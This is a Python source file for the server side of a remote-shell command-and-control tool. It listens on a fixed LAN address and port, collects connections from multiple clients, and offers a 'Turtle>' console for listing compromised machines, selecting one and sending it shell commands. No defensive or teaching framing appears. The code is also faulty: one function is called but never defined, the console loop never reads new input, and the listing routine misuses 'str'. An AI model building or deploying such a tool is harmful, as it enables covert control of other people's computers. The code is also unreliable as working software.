# -*- coding: utf-8 -*-
# @Author: prateek
# @Date:   2020-10-07 23:55:25
# @Last Modified by:   prateek
# @Last Modified time: 2020-10-08 00:39:14

# Server file

import socket 
import sys
import threading
import time
from queue import Queue

NUM_THREADS=2
JOB_NUMBER = [1,2]   # 1 stands for connection and 2 stands for sending commands
all_connections = []
all_address = []
queue = Queue()

# Create a socket to join two componenets
def create_socket():
	try :
		global host
		global port
		global s 

		host="192.168.1.12"
		port = 9090
		s = socket.socket()
	except socket.error as msg:
		print('Error in creating socket '+str(msg))

# Binding the socket and listening for connections

def bind_socket():
	try :
		global host;
		global port;
		global s;

		print('Binding the Port : '+str(port))

		s.bind((host,port))
		s.listen(5)

	except socket.error as msg:
		print('Error in binding socket '+str(msg) +'\n' + 'Retrying ...\n')
		bind_socket()



# Establish the connection with the client 
def accept_conn():
	

	conn,addr = s.accept()
	print('Connection has been established with IP Address : '+str(addr[0] + " with Port Number : "+str(addr[1])))
	send_command(conn)


	conn.close()

# Handling connections from multiple clients
# CLosing all previous connections when server is restarted

def accept_connection():
	for c in all_connections:
		c.close()

	del all_connections[:]
	del all_address[:]

	while True : 
		try :
			conn,address = s.accept()
			s.setblocking(1) #prevents timeout
			all_connections.append(conn)
			all_address.append(address)

			print('Connection has been established '+ str(address[0]))

		except :
			print('Error accepting connection')	


# Creating Custom Terminal

def start_turtle() :
	cmd = input('Turtle> ')
	while True :
		if cmd == 'list':
			list_connection()
		elif 'select' in cmd :
			conn = get_target(cmd)

			if conn is not None :
				send_target_commands(conn)
		else:
			print('Command not recognized')



# List all active connections
def list_connection():
	results = ''
	for i,conn in enumerate(all_connections):
		try:
			conn.send(str.encode(''))
			conn.recv(20180)
		except:
			del all_connections[i]
			del all_address[i]
			continue

		results = str[i] + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1])+ "\n"

	print('---Client---'+"\n"+results)

# Get the target
def get_target(cmd):
	try:
		target = cmd.replace('select ','')
		target = int(target)
		conn = all_connections[target]
		print('You are now connected to :' + str(all_address[target][0]))
		print(str(all_address[target][0])+">",end = '')
		return conn
	except:
		print('Selection not valid')
		return None


# Sending command
def send_command(conn):
	
	while True:
		try :	
			cmd = input()
			if cmd == 'quit':
				conn.close()
				s.close()
				sys.exit()
			if len(str.encode(cmd)) > 0 :
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480),'utf-8')
				print(client_response + '\n',end = "")
		except :
			print('Error sending command')
			break 
			# we reach the except when the conn is destroyed


# Create worker threads
def create_workers():
	for _ in range(NUM_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

# Do the next job in the queue
def work():
	while True:
		x = queue.get()
		if x == 1:
			create_socket()
			bind_socket()
			accept_connection()

		if x==2:
			start_turtle()



		queue.task_done()

def create_jobs():
	for s in JOB_NUMBER:
		queue.put(s)

	queue.join()




def main():
	create_workers()
	create_jobs()

main()

